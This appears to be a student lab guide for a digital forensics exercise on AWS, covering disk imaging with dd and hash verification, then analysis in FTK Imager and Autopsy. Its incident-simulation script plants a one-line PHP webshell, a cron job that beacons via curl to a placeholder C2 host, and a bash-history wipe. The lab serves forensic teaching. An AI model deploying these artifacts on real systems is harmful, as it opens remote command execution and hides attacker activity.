# Digital Forensics Investigation

## Project Summary

Designed and executed a digital forensics investigation on AWS using the **default VPC**, simulating a compromised server and performing a complete forensic workflow — evidence acquisition, hashing/chain of custody, and analysis. Used a **Victim Server** (planted with attacker artifacts: hidden files, a webshell, tampered logs, deleted documents) and imaged its evidence disk using `dd` with SHA256 hash verification. Transferred the forensic image to a **Forensic Workstation** (Windows Server EC2, RDP access) and analyzed it using **FTK Imager** and **Autopsy** to recover deleted files, build a timeline of attacker activity, and extract evidence. Compiled a formal forensic investigation report with findings and a preserved chain of custody.

## AWS Services Used

1. IAM – Identity and Access Management
2. Default VPC (no custom VPC/subnet/IGW/route table setup needed)
3. Default Security Group (edited for lab access)
4. EC2 – Elastic Compute Cloud (Victim Server + Forensic Workstation)
5. EBS – Extra volume attached as the "evidence disk" to be imaged
6. Key Pairs (SSH access) + RDP (for Windows workstation)

## Security Tools Used

1. **FTK Imager** – Disk imaging & evidence acquisition (view/verify image)
2. **Autopsy** – Digital forensic investigation (file recovery, timeline, keyword search)
3. **dd** / SHA256sum – Linux-side bit-for-bit imaging + hash verification (chain of custody)

---

## Project Mind Map

```
├── IAM
│   ├── Create IAM User
│   ├── Attach Policies
│   └── Login to Console
│
├── Networking (Default VPC)
│   └── Use existing default VPC + default subnet
│       (no custom VPC/IGW/Route Table needed)
│
├── Security Group (Default SG - edited)
│   ├── SSH (22) → Your IP only (Victim Server)
│   └── RDP (3389) → Your IP only (Forensic Workstation)
│
├── EC2 Setup
│   ├── Instance 1: Victim Server (Ubuntu 22.04)
│   │   ├── Attach extra EBS volume (evidence disk, e.g. 5 GB)
│   │   ├── Plant incident artifacts (webshell, hidden files, deleted doc, tampered log)
│   │   └── Image the evidence disk with dd + SHA256 hash
│   │
│   └── Instance 2: Forensic Workstation (Windows Server 2022)
│       ├── Install FTK Imager
│       ├── Install Autopsy
│       └── Transfer evidence image (.dd/.img) for analysis
│
├── Incident Simulation (on Victim Server)
│   ├── Attacker uploads a webshell → /var/www/html/shell.php
│   ├── Attacker creates hidden file → /home/ubuntu/.secret_data
│   ├── Attacker deletes an incriminating document
│   ├── Attacker adds malicious cron job (persistence)
│   └── Attacker clears/tampers bash_history
│
├── Acquisition Phase
│   ├── Unmount evidence volume (preserve state)
│   ├── SHA256 hash BEFORE imaging
│   ├── dd bit-for-bit image → evidence.dd
│   ├── SHA256 hash AFTER imaging (must match — proves integrity)
│   └── Transfer image to Forensic Workstation (scp/WinSCP)
│
├── Analysis Phase (Autopsy + FTK Imager)
│   ├── FTK Imager → mount/verify image, view raw structure
│   ├── Autopsy → create new case, add image as data source
│   ├── Recover deleted files
│   ├── Keyword search (e.g. "password", "confidential")
│   ├── Timeline analysis (file creation/modification/access times)
│   └── Extract webshell, hidden file, deleted doc as evidence
│
└── Final Output
    ├── Chain of Custody document (hashes match = untampered evidence)
    ├── Timeline of attacker activity
    └── Forensic Investigation Report
```

---

## Project Setup Guide

### 1. IAM Setup

- Create IAM user
- Attach policy: `AmazonEC2FullAccess`
- Login using IAM credentials

### 2. Use Default VPC (no custom networking needed)

- Default VPC + default subnet la direct ah EC2 launch panniduvom
- Separate VPC/Subnet/IGW/Route table create pannanum nu illa

### 3. Security Group (edit the default one)

- SSH (22) → Your IP only
- RDP (3389) → Your IP only *(needed for the Windows Forensic Workstation GUI)*

### 4. Launch EC2 Instances

Launch **2 instances** in the **default VPC / default subnet**:

| Instance | OS | Purpose |
|---|---|---|
| Victim Server | Ubuntu 22.04 LTS | Compromised machine (evidence source) |
| Forensic Workstation | Windows Server 2022 | Runs FTK Imager + Autopsy (GUI tools) |

> FTK Imager & Autopsy la best ah GUI la work aagum, adhunala Forensic Workstation ku Windows AMI select pannunga. Enable public IP for both, attach the edited SG.

### 5. Attach an Extra EBS Volume to Victim Server

- EC2 Console → Elastic Block Store → Volumes → Create Volume (5 GB, same AZ as Victim Server)
- Attach it to the Victim Server as `/dev/xvdf`

```bash
# On Victim Server — format and mount the evidence disk
sudo mkfs -t ext4 /dev/xvdf
sudo mkdir /evidence
sudo mount /dev/xvdf /evidence
```

---

### 6. Simulate the Incident (Plant Evidence on Victim Server)

```bash
#!/bin/bash
# Simulated webshell (attacker persistence)
sudo mkdir -p /evidence/www
echo '<?php system($_GET["cmd"]); ?>' | sudo tee /evidence/www/shell.php

# Hidden file with "stolen" data
echo "Confidential: employee_salaries.csv, db_password=admin123" | sudo tee /evidence/.secret_data

# Create then delete an incriminating document (forensics will recover this)
echo "Internal memo: security incident covered up on 2024-03-15" | sudo tee /evidence/incident_notes.txt
sudo rm /evidence/incident_notes.txt

# Simulated malicious cron entry
(sudo crontab -l 2>/dev/null; echo "*/5 * * * * curl http://malicious-c2.example.com/beacon") | sudo crontab -

# Tamper bash history (attacker covering tracks)
sudo bash -c 'echo "history -c" >> /home/ubuntu/.bashrc'
```

> Idha "attacker planted evidence" nu treat pannunga — real investigation la, indha maari artifacts than recover pannanum.

### 7. Acquisition — Image the Evidence Disk (dd + Hashing)

```bash
# Unmount before imaging (standard forensic practice — don't image a live/mounted disk)
sudo umount /evidence

# Hash the disk BEFORE imaging
sudo sha256sum /dev/xvdf > pre_image_hash.txt
cat pre_image_hash.txt

# Create bit-for-bit forensic image
sudo dd if=/dev/xvdf of=/home/ubuntu/evidence.dd bs=4M status=progress

# Hash the resulting image file
sha256sum /home/ubuntu/evidence.dd > post_image_hash.txt
cat post_image_hash.txt

# Also hash the source device again — must match the image hash
sudo sha256sum /dev/xvdf >> post_image_hash.txt
```

> **Chain of custody proof**: `pre_image_hash.txt` and the device hash in `post_image_hash.txt` harkka match aaganum. Match aana, image untampered nu proof — idhu than court-admissible evidence handling standard.

### 8. Transfer Image to Forensic Workstation

```bash
# From your laptop (or use WinSCP on the Windows workstation)
scp -i your-key.pem ubuntu@<VICTIM_SERVER_PUBLIC_IP>:/home/ubuntu/evidence.dd .

# Then upload/copy evidence.dd + both hash .txt files to the Forensic Workstation (via RDP file transfer or WinSCP)
```

---

### 9. Install Tools on Forensic Workstation (Windows Server 2022, via RDP)

- RDP into the instance: `<FORENSIC_WORKSTATION_PUBLIC_IP>:3389`
- Download and install **FTK Imager** (free, from AccessData/Exterro website)
- Download and install **Autopsy** (free, from autopsy.com — Windows installer)

### 10. FTK Imager — Verify & Inspect the Image

- Open FTK Imager → **File → Add Evidence Item** → Image File → select `evidence.dd`
- Right-click the image → **Verify Image Integrity** → compare hash against `post_image_hash.txt` (must match)
- Browse the file structure — confirm `shell.php`, `.secret_data`, cron artifacts are visible

### 11. Autopsy — Full Investigation

- Open Autopsy → **New Case** → name it (e.g. `Victim-Server-Investigation`)
- **Add Data Source** → Disk Image → select `evidence.dd`
- Run ingest modules: File Type Identification, Recent Activity, Keyword Search

**Key investigation steps:**
- **File browsing**: locate `shell.php` (webshell), `.secret_data` (hidden file)
- **Deleted Files**: Autopsy's "Deleted Files" view → recover `incident_notes.txt` (proves deletion doesn't destroy data)
- **Keyword Search**: search for `password`, `confidential`, `malicious-c2` → surfaces relevant evidence automatically
- **Timeline Analysis**: Autopsy → **Timeline** tool → visualize file creation/modification order → reconstruct attacker's sequence of actions

### 12. Analysis & Report Generation

| Evidence Found | Location | Significance |
|---|---|---|
| Webshell (`shell.php`) | `/evidence/www/` | Remote code execution backdoor — attacker persistence |
| Hidden file (`.secret_data`) | `/evidence/` | Exfiltrated confidential data staged locally |
| Deleted file (`incident_notes.txt`) | Recovered via Autopsy | Proof of attempted cover-up |
| Malicious cron job | crontab | C2 beaconing / persistence mechanism |
| Bash history tampering | `.bashrc` | Anti-forensic technique — attacker covering tracks |

### 13. Final Architecture Flow

```
Victim Server (evidence planted) → EBS volume unmounted → dd imaging → evidence.dd + hashes
evidence.dd → transferred → Forensic Workstation (Windows, RDP)
FTK Imager → verify hash integrity → confirm evidence untampered
Autopsy → deep analysis → recovered files + timeline + keyword hits
Findings → Chain of Custody + Forensic Report
```

### 14. Final Output

- `pre_image_hash.txt` and `post_image_hash.txt` (proving chain of custody)
- FTK Imager verification screenshot (hash match confirmation)
- Autopsy case with recovered deleted file, webshell, hidden file, timeline
- Final consolidated **Digital Forensics Investigation Report**

---

## Deliverable Checklist (for student submission)

- [ ] `pre_image_hash.txt` / `post_image_hash.txt` (hash match proof)
- [ ] `evidence.dd` forensic image
- [ ] FTK Imager screenshot: hash verification passed
- [ ] Autopsy screenshots: recovered deleted file, webshell found, timeline view
- [ ] Final Word/PDF report: Evidence list + Timeline + Conclusions + Chain of Custody
